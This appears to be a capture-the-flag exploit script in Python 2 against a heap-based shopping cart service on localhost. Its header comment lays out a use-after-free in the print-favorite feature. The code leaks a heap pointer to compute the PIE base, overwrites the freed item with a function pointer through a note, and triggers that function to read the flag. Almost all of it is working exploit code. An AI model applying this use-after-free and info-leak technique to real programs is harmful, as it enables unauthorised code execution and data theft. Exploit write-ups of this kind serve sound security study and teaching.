'''
Items get malloced then put into your cart
Notes do not get there own malloced areas of memories
Cart gets realloced every time new item is added
Favorite item gets stored and can be printed out
Vuln comes from no error checking in print favorite item section
Delete favorite item then print and you have a use after free vulnerability

PROBLEMS TO OVERCOME:
PIE
HOW TO GET CONTROL FROM DEREFERENCE?

Solutions:
If you add an item then delete it then add a note the note gets placed where the deleted item was 
This leads to both solutions list notes will not be null terminated thus leaking stack garbage
Also if you add items delete last item and put note there you can control eax which is then dereferenced
Also if ou change favorite when no real favorite is defined you can allocate new memory that is not displayed in the cart
'''

from isis import *
'''Mapped important functionality to functions'''
def sl():
	time.sleep(0.1)
def add_app(s):
	s.send("6\n0\n")
	return s.recv(0x5000)
def add_pear(s):
	s.send("6\n1\n")
	return s.recv(0x5000)
def delo(s, n):
	s.send("8\n" + str(n) + "\n")
	return s.recv(0x5000)
def add_note(s,note):
	s.send("2\n" + note + "\n")
	return s.recv(0x5000)
def list_note(s):
	s.send("1\n")
	return s.recv(0x5000)
def del_note(s,n):
	s.send("5\n" + str(n) + "\n")
	return s.recv(0x5000)
def set_fav(s,n):
	s.send("9\n" + str(n) + "\n")
	return s.recv(0x5000)
def print_fav(s):
	s.send("11\n")
	return s.recv(0x5000)
def change_fav(s,n):
	s.send("10\n" + str(n) + "\n")
	return s.recv(0x5000)

def info_leak(s):
	''' add item set favorite delete favorite add notes allocate new block by changing favorite and list notes'''
	add_app(s)
	set_fav(s,0)
	delo(s,0)
	add_note(s,"poop")
	add_note(s, "poop")
	change_fav(s,0)
	list_note(s)
	recv_until(s, "#0") 
	'''binary is stripped but main is stillmapped thus are able to get base of pie easily through gdb'''
	return hex((int(hex(ulei64(s.recv(0x20))[0])[:14],16) - 0x203d50))

def crash(pie):
	'''add bunch of items set fav delete fav add note where fav was print fav'''
	for i in range(10):
		add_app(s)
	set_fav(s, 9)
	delo(s,9)
	func = int(pie,16) + 0x203cc0 #0x1a90
	print "JUMPING TO: " + hex(func) 
	add_note(s,lei64(func))
	print_fav(s)

def flag(s):
	'''binary has file reading functionality but only for admin bypass check 
	cat flag one note is the crash is from a dereference so you need a pointer to the function'''
	s.send("flag\n")
	s.recv(0x5000)
	s.send("1\n")
	recv_until(s,"#2:")
	print "FLAG:",s.recv(0x40)
	return

s = get_socket(("localhost", 37717))
s.settimeout(100000)
raw_input("?")
pie = info_leak(s)
print "BASE OF PIE = ", pie
crash(pie)
flag(s)

